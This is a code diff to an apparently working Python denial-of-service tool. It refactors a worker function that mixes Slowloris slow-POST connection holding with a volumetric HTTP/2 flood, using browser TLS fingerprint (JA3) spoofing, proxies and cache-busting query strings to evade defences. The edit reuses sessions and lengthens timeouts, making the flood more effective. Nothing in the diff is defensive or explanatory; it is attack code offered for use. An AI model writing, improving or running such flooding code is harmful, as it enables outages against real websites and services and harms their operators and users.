@@ -719,11 +719,11 @@ async def WorkerTask(counter, semaphore):
 	# 10% of threads will be dedicated to Slowloris connection holding, 90% for Volumetric Flood
 	is_slowloris = random.random() < 0.10
 
-	while True:
-		try:
-			async with semaphore:
-				# AsyncSession with HTTP/2 support and JA3 spoofing
-				async with AsyncSession(impersonate=browser, proxy=proxy_url, verify=False) as session:
+	try:
+		async with semaphore:
+			# AsyncSession with HTTP/2 support and JA3 spoofing
+			async with AsyncSession(impersonate=browser, proxy=proxy_url, verify=False) as session:
+				while True:
 					if is_slowloris:
 						# SLOWLORIS MODE: Slow POST Request
 						target = "http://" + random.choice(ips).strip() if choice1 == "1" else url
@@ -748,7 +748,7 @@ async def WorkerTask(counter, semaphore):
 							try:
 								target = "http://" + random.choice(ips).strip() if choice1 == "1" else url
 								target_with_buster = f"{target}?_cb={random.randint(100000, 99999999)}"
-								response = await session.get(target_with_buster, headers=extra_headers, timeout=5.0)
+								response = await session.get(target_with_buster, headers=extra_headers, timeout=10.0)
 								# Log only 2% of successful requests so console output doesn't bottleneck the script
 								if random.random() < 0.02 or response.status_code >= 400:
 									logging.info(f"[FAST] Thread {counter} | Status: {response.status_code}")
@@ -760,10 +760,10 @@ async def WorkerTask(counter, semaphore):
 						# Blast everything concurrently over the same HTTP/2 session
 						req_tasks = [make_request() for _ in range(multiple)]
 						await asyncio.gather(*req_tasks)
-		except asyncio.CancelledError:
-			break # Exit gracefully on Ctrl+C
-		except Exception:
-			await asyncio.sleep(0.1)
+	except asyncio.CancelledError:
+		pass # Exit gracefully on Ctrl+C
+	except Exception:
+		pass
 
 
 if __name__ == '__main__':
